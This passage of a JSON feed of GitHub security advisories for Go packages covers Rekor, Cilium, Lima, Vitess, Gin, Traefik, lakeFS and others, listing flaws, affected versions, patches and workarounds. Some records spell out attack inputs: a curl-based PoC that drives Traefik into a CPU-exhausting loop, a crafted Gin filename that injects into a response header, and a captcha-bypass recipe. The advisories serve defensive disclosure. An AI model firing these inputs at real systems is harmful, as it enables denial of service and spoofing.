Workaround\nThere are no workarounds, users should update.\n\n## Vulnerability 2: OOM due to large .SIGN and .PKGINFO files in APK files.\n### Summary\nParsing of an APK file submitted to Rekor can cause an out of memory crash if the .SIGN or .PKGINFO files within the APK are sufficiently large.\n\n### Details\nWhen parsing an APK file, Rekor allocates byte slices to read both the .SIGN and .PKGINFO files into memory in order to verify the signature and hashes in the APK. These byte slices are allocated based on the size included in the tar header for each file, with no checks performed on that size. If the size in the header is sufficiently large, either because the uncompressed file is large or the size in the header has been artificially set to a large value, Rekor will crash due to an out of memory panic.\n\n### Patches\nUsers should update to the latest version of Rekor, 1.1.1.\n\n### Workaround\nThere are no workarounds, users should update.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/rekor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/rekor/security/advisories/GHSA-2h5h-59f5-c5x9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30551"}, {"type": "WEB", "url": "https://github.com/sigstore/rekor/commit/cf42ace82667025fe128f7a50cf6b4cdff51cc48"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/rekor"}, {"type": "WEB", "url": "https://github.com/sigstore/rekor/releases/tag/v1.1.1"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-05-03T21:56:23Z", "nvd_published_at": "2023-05-08T16:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2h44-x2wx-49f4", "modified": "2023-06-02T23:57:03Z", "published": "2023-05-22T20:33:15Z", "aliases": ["CVE-2023-30851"], "summary": "Potential HTTP policy bypass when using header rules in Cilium", "details": "### Impact\n\nThis issue only impacts users who:\n\n- Have a HTTP policy that applies to multiple `toEndpoints` AND\n- Have an allow-all rule in place that affects only one of those endpoints\n\nIn such cases, a wildcard rule will be appended to the set of HTTP rules, which could cause bypass of HTTP policies.\n\n### Patches\n\nThis issue has been patched in Cilium 1.11.16, 1.12.9, and 1.13.2.\n\n### Workarounds\n\nRewrite HTTP rules for each endpoint separately. For example, if the initial rule looks like:\n\n```\n  egress:\n    - toEndpoints:\n        - matchLabels:\n            k8s:kind: echo\n        - matchLabels:\n            k8s:kind: example\n      toPorts:\n        - ports:\n            - port: \"8080\"\n              protocol: TCP\n          rules:\n            http:\n              - method: \"GET\"\n```\n\nIt should be rewritten to:\n \n```\n  egress:\n    - toEndpoints:\n        - matchLabels:\n            k8s:kind: echo\n      toPorts:\n        - ports:\n            - port: \"8080\"\n              protocol: TCP\n          rules:\n            http:\n              - method: \"GET\"\n    - toEndpoints:\n        - matchLabels:\n            k8s:kind: example\n      toPorts:\n        - ports:\n            - port: \"8080\"\n              protocol: TCP\n          rules:\n            http:\n              - method: \"GET\"\n```     \n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @jrajahalme for investigating and fixing the issue.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nAs usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: [security@cilium.io](mailto:security@cilium.io) - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-2h44-x2wx-49f4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30851"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.11.16"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.12.9"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.13.2"}], "database_specific": {"cwe_ids": ["CWE-693"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-22T20:33:15Z", "nvd_published_at": "2023-05-25T18:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f7qw-jj9c-rpq9", "modified": "2023-05-31T23:38:28Z", "published": "2023-05-31T23:38:28Z", "aliases": ["CVE-2023-32684"], "summary": "In Lima, a malicious disk image could read a single file on the host filesystem as a qcow2/vmdk backing file", "details": "> **Note**\n>\n> The official templates of Lima, and the well-known third party products (Colima, Rancher Desktop, and Finch) are *unlikely* to be affected by this issue.\n\n### Impact\nA virtual machine instance with a malicious disk image could read a single file on the host filesystem, even when no filesystem is mounted from the host.\n\nTo exploit this issue, the attacker has to embed the target file path (an absolute or a relative path from the instance directory) in a malicious disk image, as the [qcow2 (or vmdk) backing file path string](https://gitlab.com/qemu-project/qemu/-/blob/v8.0.0/docs/interop/qcow2.txt#L23-L34).\nAs Lima refuses to run as the root, it is practically impossible for the attacker to read the entire host disk via `/dev/rdiskN`.\nAlso, practically, the attacker cannot read at least the first 512 bytes (MBR) of the target file.\n\n### Patches\nPatched in Lima v0.16.0, by prohibiting using a backing file path in the VM base image.\n\n### Workarounds\nDo not use an untrusted disk image.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/lima-vm/lima"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/lima-vm/lima/security/advisories/GHSA-f7qw-jj9c-rpq9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32684"}, {"type": "WEB", "url": "https://github.com/lima-vm/lima/commit/01dbd4d9cabe692afa4517be3995771f0ebb38a5"}, {"type": "PACKAGE", "url": "https://github.com/lima-vm/lima"}, {"type": "WEB", "url": "https://github.com/lima-vm/lima/releases/tag/v0.16.0"}], "database_specific": {"cwe_ids": ["CWE-552"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-05-31T23:38:28Z", "nvd_published_at": "2023-05-30T18:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pqj7-jx24-wj7w", "modified": "2023-05-11T19:40:49Z", "published": "2023-05-11T19:40:49Z", "aliases": ["CVE-2023-29195"], "summary": "VTAdmin users that can create shards can deny access to other functions", "details": "### Impact\nUsers can either intentionally or inadvertently create a shard containing `/` characters from VTAdmin such that from that point on, anyone who tries to create a new shard from VTAdmin will receive an error. \nAttempting to view the keyspace(s) will also no longer work.\nCreating a shard using `vtctldclient` does not have the same problem because the CLI validates the input correctly.\n\n### Patches\nv16.0.2, corresponding to [0.16.2 on pkg.go.dev](https://pkg.go.dev/vitess.io/vitess@v0.16.2)\n\n### Workarounds\n- Always use `vtctldclient` to create shards, instead of using VTAdmin\n- Disable creating shards from VTAdmin using RBAC\n- Delete the topology record for the offending shard using the client for your topology server. For example, if you created a shard called `a/b` in keyspace `commerce`, and you are running etcd, it can be deleted by doing something like\n```\n% etcdctl --endpoints \"http://${ETCD_SERVER}\" del /vitess/global/keyspaces/commerce/shards/a/b/Shard\n```\n\n### References\nhttps://github.com/vitessio/vitess/issues/12842\n\nFound during a security audit sponsored by the [CNCF](https://cncf.io) and facilitated by [OSTIF](https://ostif.org).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "vitess.io/vitess"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/vitessio/vitess/security/advisories/GHSA-pqj7-jx24-wj7w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29195"}, {"type": "WEB", "url": "https://github.com/vitessio/vitess/issues/12842"}, {"type": "WEB", "url": "https://github.com/vitessio/vitess/pull/12843"}, {"type": "WEB", "url": "https://github.com/vitessio/vitess/commit/9dcbd7de3180f47e94f54989fb5c66daea00c920"}, {"type": "PACKAGE", "url": "https://github.com/vitessio/vitess"}, {"type": "WEB", "url": "https://github.com/vitessio/vitess/releases/tag/v16.0.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vitess.io/vitess@v0.16.2"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-703"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-11T19:40:49Z", "nvd_published_at": "2023-05-11T20:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mv7x-27pc-8c96", "modified": "2023-11-02T17:22:33Z", "published": "2023-05-30T15:30:27Z", "aliases": ["CVE-2023-2978"], "summary": "Go package pydio/cells vulnerable to authorization bypass", "details": "A vulnerability was found in Abstrium Pydio Cells 4.2.0. It has been rated as problematic. Affected by this issue is some unknown functionality of the component Change Subscription Handler. The manipulation leads to authorization bypass. Upgrading to version 4.2.1 is able to address this issue. It is recommended to upgrade the affected component. VDB-230210 is the identifier assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pydio/cells"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2978"}, {"type": "WEB", "url": "https://popalltheshells.medium.com/multiple-cves-affecting-pydio-cells-4-2-0-321e7e4712be"}, {"type": "WEB", "url": "https://pydio.com/en/community/releases/pydio-cells/pydio-cells-enterprise-421"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.230210"}, {"type": "WEB", "url": "https://vuldb.com/?id.230210"}, {"type": "PACKAGE", "url": "github.com/pydio/cells"}], "database_specific": {"cwe_ids": ["CWE-639"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-31T18:26:17Z", "nvd_published_at": "2023-05-30T14:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hqxw-f8mx-cpmw", "modified": "2023-05-11T20:37:54Z", "published": "2023-05-11T20:37:54Z", "aliases": ["CVE-2023-2253"], "summary": "distribution catalog API endpoint can lead to OOM via malicious user input", "details": "### Impact\n\nSystems that run `distribution` built after a specific commit running on memory-restricted environments can suffer from denial of service by a crafted malicious `/v2/_catalog` API endpoint request. \n\n### Patches\n\nUpgrade to at least 2.8.2-beta.1 if you are running `v2.8.x` release. If you use the code from the main branch, update at least to the commit after [f55a6552b006a381d9167e328808565dd2bf77dc](https://github.com/distribution/distribution/commit/f55a6552b006a381d9167e328808565dd2bf77dc).\n\n### Workarounds\n\nThere is no way to work around this issue without patching. Restrict access to the affected API endpoint: see the recommendations section.\n\n### References\n\n`/v2/_catalog` endpoint accepts a parameter to control the maximum amount of records returned (query string: `n`).\n\nWhen not given the default `n=100` is used.  The server trusts that `n` has an acceptable value, however when using a \nmaliciously large value, it allocates an array/slice of `n` of strings before filling the slice with data.\n\nThis behaviour was introduced ~7yrs ago [1].\n\n### Recommendation\n\nThe `/v2/_catalog` endpoint was designed specifically to do registry syncs with search or other API systems. Such an endpoint would create a lot of load on the backend system, due to overfetch required to serve a request in certain implementations.\n\nBecause of this, we strongly recommend keeping this API endpoint behind heightened privilege and avoiding leaving it exposed to the internet.\n\n###  For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [distribution repository](https://github.com/distribution/distribution)\n* Email us at [cncf-distribution-security@lists.cncf.io](mailto:cncf-distribution-security@lists.cncf.io)\n\n[1] [faulty commit](https://github.com/distribution/distribution/blob/b7e26bac741c76cb792f8e14c41a2163b5dae8df/registry/handlers/catalog.go#L45)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/distribution"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.8.2-beta.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/distribution/distribution/security/advisories/GHSA-hqxw-f8mx-cpmw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2253"}, {"type": "WEB", "url": "https://github.com/distribution/distribution/commit/f55a6552b006a381d9167e328808565dd2bf77dc"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2189886"}, {"type": "PACKAGE", "url": "https://github.com/distribution/distribution"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/06/msg00035.html"}], "database_specific": {"cwe_ids": ["CWE-475", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:37:54Z", "nvd_published_at": "2023-06-06T20:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2c4m-59x9-fr2g", "modified": "2023-06-16T17:57:38Z", "published": "2023-05-12T20:19:25Z", "aliases": ["CVE-2023-29401"], "summary": "Gin Web Framework does not properly sanitize filename parameter of Context.FileAttachment function", "details": "The filename parameter of the Context.FileAttachment function is not properly sanitized. A maliciously crafted filename can cause the Content-Disposition header to be sent with an unexpected filename value or otherwise modify the Content-Disposition header. For example, a filename of \"setup.bat&quot;;x=.txt\" will be sent as a file named \"setup.bat\".\n\nIf the FileAttachment function is called with names provided by an untrusted source, this may permit an attacker to cause a file to be served with a name different than provided. Maliciously crafted attachment file name can modify the Content-Disposition header.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gin-gonic/gin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.1-0.20190301021747-ccb9e902956d"}, {"fixed": "1.9.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29401"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/issues/3555"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/3556"}, {"type": "PACKAGE", "url": "https://github.com/gin-gonic/gin"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/releases/tag/v1.9.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1737"}], "database_specific": {"cwe_ids": ["CWE-494"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-12T20:19:25Z", "nvd_published_at": "2023-06-08T21:15:16Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q3j6-22wf-3jh9", "modified": "2023-05-11T20:39:55Z", "published": "2023-05-11T20:39:55Z", "aliases": [], "summary": "github.com/ipfs/go-bitswap vulnerable to DOS unbounded persistent memory leak", "details": "This package has been moved to [`github.com/ipfs/boxo/bitswap`](https://pkg.go.dev/github.com/ipfs/boxo/bitswap), this vulnerability is tracked there: https://github.com/ipfs/boxo/security/advisories/GHSA-m974-xj4j-7qv5 (`CVE-2023-25568`)\n\n### Remediation\nThis is a two step process:\n1. Apply one of:\n   - (**recommended**) upgrade from `github.com/ipfs/go-bitswap` to `github.com/ipfs/boxo/bitswap`.\n   - If you are still using `github.com/ipfs/go-bitswap` and cannot upgrade to `boxo`, you can upgrade to `github.com/ipfs/go-bitswap@v0.12.0`, this will replace the `go-bitswap` implementation by stubs which points to `boxo`.\n2. Open https://github.com/ipfs/boxo/security/advisories/GHSA-m974-xj4j-7qv5 and then follow `boxo`'s remediation section.\n\n### Vulnerable symbols\n- `>= v0.9.0; < v0.12.0`\n  - `github.com/ipfs/go-bitswap/server/internal/decision.(*Engine).MessageReceived`\n  - `github.com/ipfs/go-bitswap/server/internal/decision.(*Engine).NotifyNewBlocks`\n  - `github.com/ipfs/go-bitswap/server/internal/decision.(*Engine).findOrCreate`\n  - `github.com/ipfs/go-bitswap/server/internal/decision.(*Engine).PeerConnected`\n- `v0.8.0`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).MessageReceived`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).NotifyNewBlocks`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).findOrCreate`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).PeerConnected`\n- `< v0.8.0`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).MessageReceived`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).receiveBlocksFrom`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).findOrCreate`\n  - `github.com/ipfs/go-bitswap/internal/decision.(*Engine).PeerConnected`\n\n### Workarounds\nIf you are using the stubs at `github.com/ipfs/go-bitswap` and not taking advantage of the features provided by the server, refactoring your code to use the new split API will allows you to run in a client-only mode using: [`github.com/ipfs/go-bitswap/client`](https://pkg.go.dev/github.com/ipfs/go-bitswap/client).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-bitswap"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/boxo/security/advisories/GHSA-m974-xj4j-7qv5"}, {"type": "WEB", "url": "https://github.com/ipfs/go-bitswap/security/advisories/GHSA-q3j6-22wf-3jh9"}, {"type": "WEB", "url": "https://github.com/ipfs/go-libipfs/security/advisories/GHSA-m974-xj4j-7qv5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25568"}, {"type": "WEB", "url": "https://github.com/ipfs/boxo/commit/62cbac40b96f49e39cd7fedc77ee6b56adce4916"}, {"type": "WEB", "url": "https://github.com/ipfs/boxo/commit/9cb5cb54d40b57084d1221ba83b9e6bb3fcc3197"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-bitswap"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:39:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5mmw-p5qv-w3x5", "modified": "2023-12-14T22:03:11Z", "published": "2023-12-12T00:30:17Z", "aliases": ["CVE-2023-45292"], "summary": "Always incorrect control flow in github.com/mojocn/base64Captcha", "details": "When using the default implementation of Verify to check a Captcha, verification can be bypassed. For example, if the first parameter is a non-existent id, the second parameter is an empty string, and the third parameter is true, the function will always consider the Captcha to be correct.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mojocn/base64Captcha"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45292"}, {"type": "WEB", "url": "https://github.com/mojocn/base64Captcha/issues/120"}, {"type": "WEB", "url": "https://github.com/mojocn/base64Captcha/commit/5ab86bd6f333aad3936f912fc52b411168dcd4a7"}, {"type": "WEB", "url": "https://github.com/mojocn/base64Captcha/commit/9b11012caca58925f1e47c770f79f2fa47e3ad13"}, {"type": "PACKAGE", "url": "https://github.com/mojocn/base64Captcha"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-2386"}], "database_specific": {"cwe_ids": ["CWE-345", "CWE-670"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-12T18:09:52Z", "nvd_published_at": "2023-12-11T22:15:06Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6fwg-jrfw-ff7p", "modified": "2023-12-05T18:13:54Z", "published": "2023-12-05T18:13:53Z", "aliases": ["CVE-2023-47633"], "summary": "Traefik docker container using 100% CPU", "details": "### Summary\n\nThe traefik docker container uses 100% CPU when it serves as its own backend, which is an automatically generated route resulting from the Docker integration in the default configuration.\n\n### Details\n\nWhile attempting to set up Traefik to handle traffic for Docker containers, I observed in the webUI a rule with the following information:\n\n`Host(traefik-service) | webwebsecure | traefik-service@docker | traefik-service`\n\nI assumed that this is something internal; however, I wondered why it would have a host rule on the web entrypoint configured.\n\nSo I have send a request with that hostname with `curl -v --resolve \"traefik-service:80:xxx.xxx.xxx.xxx\" http://traefik-service`. That made my whole server unresponsive.\n\nI assume the name comes from a docker container with that name, traefik itself:\n```\nlocalhost ~ # docker ps\nCONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES\nd1414e74aec7   traefik:v2.10                                           \"/entrypoint.sh trae\u2026\"   4 minutes ago       Up 4 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:443->443/tcp, :::443->443/tcp, 127.0.0.1:8080->8080/tcp   traefik.service\n```\n\n### PoC\n\n1. Start traefik with `docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -p 80:80 --name foo -p 8080:8080 traefik:v2.10 --api.insecure=true --providers.docker`\n\n2. `curl -v --resolve \"foo:80:127.0.0.1\" http://foo`\n\nlooks like this creates an endless loop of request.\n\nKnowing the name of the docker container seems to be enough to trigger this, if the docker backend is used.\n\n### Impact\n\nServer is unreachable and uses 100% CPU", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.10.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.0-beta5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47633"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.10.6"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-05T18:13:53Z", "nvd_published_at": "2023-12-04T21:15:34Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m8rw-rcpq-2vp2", "modified": "2023-12-13T13:34:20Z", "published": "2023-12-13T13:34:20Z", "aliases": [], "summary": "Improper Privilege Management in github.com/sap/cloud-security-client-go", "details": "### Impact\nSAP BTP Security Services Integration Library ([Golang] github.com/sap/cloud-security-client-go) allows under certain conditions an escalation of privileges. On successful exploitation, an unauthenticated attacker can obtain arbitrary permissions within the application.\n\n### Patches\nUpgrade to patched version >= 0.17.0\nWe always recommend to upgrade to the latest released version.\n\n### Workarounds\nNo workarounds\n\n### References\nhttps://www.cve.org/CVERecord?id=CVE-2023-50424", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sap/cloud-security-client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/SAP/cloud-security-client-go/security/advisories/GHSA-m8rw-rcpq-2vp2"}, {"type": "WEB", "url": "https://github.com/SAP/cloud-security-services-integration-library/security/advisories/GHSA-59c9-pxq8-9c73"}, {"type": "WEB", "url": "https://github.com/SAP/cloud-security-client-go/commit/2e3bd63e152e09f267316a1071034eb5d4b7f498"}, {"type": "WEB", "url": "https://blogs.sap.com/2023/12/12/unveiling-critical-security-updates-sap-btp-security-note-3411067/"}, {"type": "PACKAGE", "url": "https://github.com/SAP/cloud-security-client-go"}, {"type": "WEB", "url": "https://me.sap.com/notes/3411067"}, {"type": "WEB", "url": "https://www.sap.com/documents/2022/02/fa865ea4-167e-0010-bca6-c68f7e60039b.html"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-12-13T13:34:20Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-92cg-ghq6-9587", "modified": "2023-12-15T03:39:45Z", "published": "2023-12-12T03:31:45Z", "aliases": ["CVE-2023-50424"], "summary": "Privilege escalation in sap/cloud-security-client-go", "details": "SAP\u00a0BTP\u00a0Security Services Integration Library ([Golang] github.com/sap/cloud-security-client-go) - versions < 0.17.0, allow under certain conditions an escalation of privileges. On successful exploitation, an unauthenticated attacker can obtain arbitrary permissions within the application.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sap/cloud-security-client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/SAP/cloud-security-services-integration-library/security/advisories/GHSA-59c9-pxq8-9c73"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-50424"}, {"type": "WEB", "url": "https://blogs.sap.com/2023/12/12/unveiling-critical-security-updates-sap-btp-security-note-3411067/"}, {"type": "PACKAGE", "url": "https://github.com/SAP/cloud-security-client-go"}, {"type": "WEB", "url": "https://me.sap.com/notes/3411067"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/sap/cloud-security-client-go@v0.17.0"}, {"type": "WEB", "url": "https://www.sap.com/documents/2022/02/fa865ea4-167e-0010-bca6-c68f7e60039b.html"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-639"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-12-15T03:39:45Z", "nvd_published_at": "2023-12-12T03:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-26hr-q2wp-rvc5", "modified": "2023-12-12T00:58:04Z", "published": "2023-12-12T00:58:04Z", "aliases": [], "summary": "User with permission to write actions can impersonate another user when auth token is configured in environment variable", "details": "### Impact\n\nWhen lakeFS is configured with **ALL** of the following:\n\n- Configuration option `auth.encrypt.secret_key` passed through environment variable\n- Actions enabled via configuration option `actions.enabled` (default enabled)\n\nthen a user who can configure an action can impersonate any other user.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\n### Workarounds\n\n**ANY ONE** of these is sufficient to prevent the issue:\n\n* Do not pass `auth.encrypt.secret_key` through an environment variable.\n\n   For instance, Kubernetes users can generate the entire configuration as a secret and mount that.  This is described [here](https://kubernetes.io/docs/concepts/configuration/secret/#using-a-secret).\n* Disable actions.\n* Limit users allowed to configure actions.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/treeverse/lakefs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/treeverse/lakeFS/security/advisories/GHSA-26hr-q2wp-rvc5"}, {"type": "PACKAGE", "url": "https://github.com/treeverse/lakeFS"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-12T00:58:04Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jpfp-xq3p-4h3r", "modified": "2023-12-27T15:06:30Z", "published": "2023-12-23T21:30:30Z", "aliases": ["CVE-2016-15036"], "summary": "Deis Workflow Manager race condition vulnerability", "details": "** UNSUPPORTED WHEN ASSIGNED ** A vulnerability was found in Deis Workflow Manager up to 2.3.2. It has been classified as problematic. This affects an unknown part. The manipulation leads to race condition. The complexity of an attack is rather high. The exploitability is told to be difficult. Upgrading to version 2.3.3 is able to address this issue. The patch is named 31fe3bccbdde134a185752e53380330d16053f7f. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-248847. NOTE: This vulnerability only affects products that are no longer supported by the maintainer.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/deis/workflow-manager"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": 